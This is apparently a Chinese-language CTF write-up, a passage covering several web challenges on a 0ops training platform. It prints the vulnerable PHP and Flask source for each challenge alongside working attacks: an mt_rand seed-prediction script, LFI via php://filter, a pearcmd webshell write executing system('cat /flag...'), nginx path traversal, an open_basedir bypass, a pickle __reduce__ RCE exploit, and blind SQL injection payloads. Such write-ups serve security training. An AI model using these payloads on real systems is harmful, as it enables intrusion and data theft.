class="string">&#x27;r1&#x27;</span>]) === <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="number">1</span> &lt;&lt; <span class="number">6</span>) &amp;&amp;</span><br><span class="line">    <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r2&#x27;</span>]) === <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span> &lt;&lt; <span class="number">6</span>, <span class="number">1</span> &lt;&lt; <span class="number">12</span>) &amp;&amp;</span><br><span class="line">    <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r3&#x27;</span>]) === <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span> &lt;&lt; <span class="number">12</span>, <span class="number">1</span> &lt;&lt; <span class="number">18</span>) &amp;&amp;</span><br><span class="line">    <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r4&#x27;</span>]) === <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span> &lt;&lt; <span class="number">18</span>, <span class="number">1</span> &lt;&lt; <span class="number">24</span>) &amp;&amp;</span><br><span class="line">    <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r5&#x27;</span>]) === <span class="title function_ invoke__">mt_rand</span>()) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>要获取flag，需要预测由mt_srand(time())生成的5个随机数。由于种子基于时间戳（秒级），可以在相同时间窗口内本地生成相同的随机序列。</p>
<p>exp.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://web1.0ops.sjtu.cn:40036/rand1/index.php&quot;</span>; <span class="comment">// 目标URL</span></span><br><span class="line"><span class="variable">$timeWindow</span> = <span class="number">10</span>; <span class="comment">// 时间窗口大小（秒）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$offset</span> = -<span class="variable">$timeWindow</span>; <span class="variable">$offset</span> &lt;= <span class="variable">$timeWindow</span>; <span class="variable">$offset</span>++) &#123;</span><br><span class="line">    <span class="variable">$seed</span> = <span class="title function_ invoke__">time</span>() + <span class="variable">$offset</span>;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 按顺序生成5个随机数</span></span><br><span class="line">    <span class="variable">$r1</span> = <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="number">1</span> &lt;&lt; <span class="number">6</span>);</span><br><span class="line">    <span class="variable">$r2</span> = <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span> &lt;&lt; <span class="number">6</span>, <span class="number">1</span> &lt;&lt; <span class="number">12</span>);</span><br><span class="line">    <span class="variable">$r3</span> = <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span> &lt;&lt; <span class="number">12</span>, <span class="number">1</span> &lt;&lt; <span class="number">18</span>);</span><br><span class="line">    <span class="variable">$r4</span> = <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span> &lt;&lt; <span class="number">18</span>, <span class="number">1</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    <span class="variable">$r5</span> = <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造请求URL</span></span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">sprintf</span>(</span><br><span class="line">        <span class="string">&quot;%s?r1=%d&amp;r2=%d&amp;r3=%d&amp;r4=%d&amp;r5=%d&quot;</span>,</span><br><span class="line">        <span class="variable">$target</span>, <span class="variable">$r1</span>, <span class="variable">$r2</span>, <span class="variable">$r3</span>, <span class="variable">$r4</span>, <span class="variable">$r5</span></span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 发送请求</span></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 检查flag</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$response</span>, <span class="string">&quot;0ops&#123;&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;成功获取flag: &quot;</span> . <span class="variable">$response</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;攻击结束，未找到flag&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{time_synchronization_4f84de405b63}</p>
</blockquote>
<h2 id="lfi-basic"><a href="#lfi-basic" class="headerlink" title="lfi - basic"></a>lfi - basic</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;phpinfo&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>] ?: <span class="string">&quot;first_flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?path=php://filter/read=convert.base64-encode/resource=first_flag.php</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{php_filter_convert_base64_3adca6f2a0ac19}</p>
</blockquote>
<h2 id="lfi-basic-shell"><a href="#lfi-basic-shell" class="headerlink" title="lfi - basic - shell"></a>lfi - basic - shell</h2><p>跟上题一样，但是需要拿shell</p>
<p>注意到register_argc_argv是on，那么可以打pearcmd</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?path=/usr/local/lib/php/pearcmd.php&amp;+config-create+/&lt;?@eval($_POST[&#x27;shell&#x27;]);?&gt;+/tmp/shell.php</span><br><span class="line">此时/tmp/shell.php已经被写入一句话木马了，后面直接包含这个文件就行</span><br><span class="line">?path=/tmp/shell.php</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">shell=system(&#x27;cat /flag/cf493265e6cb32f38faad2abb36b5bf0&#x27;);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{php_session_upload_progress_e335cb4b00c956e9}</p>
</blockquote>
<h2 id="nginx-chall-1"><a href="#nginx-chall-1" class="headerlink" title="nginx - chall - 1"></a>nginx - chall - 1</h2><p>nginx&#x2F;1.15.8</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://web1.0ops.sjtu.cn:40006/static../flag</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{bfd23c40b33ff1ecd5353cf7367d5691}</p>
</blockquote>
<h2 id="bypass-disable-functions-baby"><a href="#bypass-disable-functions-baby" class="headerlink" title="bypass_disable_functions - baby"></a>bypass_disable_functions - baby</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&quot;/tmp/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;<span class="subst">$_SERVER</span>[REMOTE_ADDR]&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html:&#x27;</span>. <span class="variable">$dir</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Open basedir: &quot;</span>.<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br></pre></td></tr></table></figure>

<p>蚁剑插件一把梭了</p>
<blockquote>
<p>0ops{put_env_ld_preload_a2067b1b32ac3a54c}</p>
</blockquote>
<h2 id="bypass-disable-functions-nomail"><a href="#bypass-disable-functions-nomail" class="headerlink" title="bypass_disable_functions - nomail"></a>bypass_disable_functions - nomail</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&quot;/tmp/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;<span class="subst">$_SERVER</span>[REMOTE_ADDR]&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html:&#x27;</span>. <span class="variable">$dir</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Open basedir: &quot;</span>.<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br></pre></td></tr></table></figure>

<p>还是蚁剑插件一把梭了</p>
<blockquote>
<p>0ops{error_log_b29da2030c0e05531db035}</p>
</blockquote>
<h2 id="bypass-open-basedir"><a href="#bypass-open-basedir" class="headerlink" title="bypass open_basedir"></a>bypass open_basedir</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&quot;/tmp/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;<span class="subst">$_SERVER</span>[REMOTE_ADDR]&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html:&#x27;</span>. <span class="variable">$dir</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Open basedir: &quot;</span>.<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">backdoor=chdir(&#x27;/tmp/be2e27bd7f3478021c6501e98dd59e60&#x27;);mkdir(&#x27;sub&#x27;);chdir(&#x27;sub&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);var_dump(scandir(&#x27;/flag&#x27;));</span><br><span class="line"></span><br><span class="line">发现flag在/flag/99daf03da0895841b9e855fa280ea65d</span><br><span class="line"></span><br><span class="line">backdoor=chdir(&#x27;/tmp/be2e27bd7f3478021c6501e98dd59e60&#x27;);mkdir(&#x27;sub&#x27;);chdir(&#x27;sub&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);$a=file_get_contents(&#x27;/flag/99daf03da0895841b9e855fa280ea65d&#x27;);var_dump($a);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{1day_from_twitter_b2549f0d6d5e596f}</p>
</blockquote>
<h2 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, render_template, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, category</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">        <span class="variable language_">self</span>.category = category</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;Animal(name=<span class="subst">&#123;self.name!r&#125;</span>, category=<span class="subst">&#123;self.category!r&#125;</span>)&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">filename, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>, encoding=encoding) <span class="keyword">as</span> fin:</span><br><span class="line">        <span class="keyword">return</span> fin.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;source&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> Response(read(__file__), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pickle_data = request.form.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">            result = pickle.loads(base64.b64decode(pickle_data))</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;unpickle_result.html&#x27;</span>, pickle_data=pickle_data, result=result)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;something wrong...&#x27;</span></span><br><span class="line"></span><br><span class="line">    sample_obj = Animal(<span class="string">&#x27;kitty&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>)</span><br><span class="line">    pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;unpickle_page.html&#x27;</span>, sample_obj=sample_obj, pickle_data=pickle_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>无过滤pickle反序列化，直接打</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">import</span> subprocess</span><br><span class="line">        <span class="keyword">return</span> (subprocess.check_output, ([<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;/app/ef47c37380ebc566ed8d2a5b0770b3f1&#x27;</span>],))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = base64.b64encode(pickle.dumps(Exploit())).decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;恶意Payload:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gASVVQAAAAAAAACMCnN1YnByb2Nlc3OUjAxjaGVja19vdXRwdXSUk5RdlCiMA2NhdJSMJS9hcHAvZWY0N2MzNzM4MGViYzU2NmVkOGQyYTViMDc3MGIzZjGUZYWUUpQu</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{py7h0n_p1ckl3_rc3_e9873fce59b89d6b}</p>
</blockquote>
<h2 id="sqli-insert"><a href="#sqli-insert" class="headerlink" title="sqli - insert"></a>sqli - insert</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;connect.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$name</span> &amp;&amp; <span class="variable">$pass</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into sqlinsert(name, pass) values(&#x27;<span class="subst">$name</span>&#x27;, &#x27;<span class="subst">$pass</span>&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$result</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;something wrong...&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;insert success&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以时间盲注，一个示例payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web1.0ops.sjtu.cn:40007/insert/index.php?name=a&amp;pass=x%27),(%27y%27,%20IF(1=1,%20SLEEP(5),%200))--%20-</span><br></pre></td></tr></table></figure>

<p>发现ctf.sqlinset表有id,name,pass三列，但是注不出来内容?</p>
<blockquote>
</blockquote>
<h2 id="sqli-bypass1"><a href="#sqli-bypass1" class="headerlink" title="sqli - bypass1"></a>sqli - bypass1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;connect.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$name</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">waf</span>(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM nocol WHERE name=&#x27;<span class="subst">$name</span>&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$result</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;something wrong...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rows</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$rows</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$rows</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经过测试，发现空格被过滤，可以用&#x2F;**&#x2F;绕过，之后就可以布尔盲注了</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">数据库名</span><br><span class="line">name=1&#x27;or/**/left(database(),3)&gt;&#x27;cte&#x27;#</span><br><span class="line">ctf</span><br><span class="line"></span><br><span class="line">表名 §§表示爆破位置</span><br><span class="line">1&#x27;or/**/ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),§1§,1))=§110§#</span><br><span class="line">nocol</span><br><span class="line"></span><br><span class="line">列名 这里失败了，貌似过滤了column</span><br><span class="line">1&#x27;or/**/ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;nocol&#x27;),§1§,1))=§110§#</span><br><span class="line">id,user,pass,whatsup</span><br><span class="line"></span><br><span class="line">数据</span><br><span class="line">1&#x27;or/**/ascii(substr((select/**/whatsup/**/from/**/bool),§1§,1))=§110§#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
</blockquote>
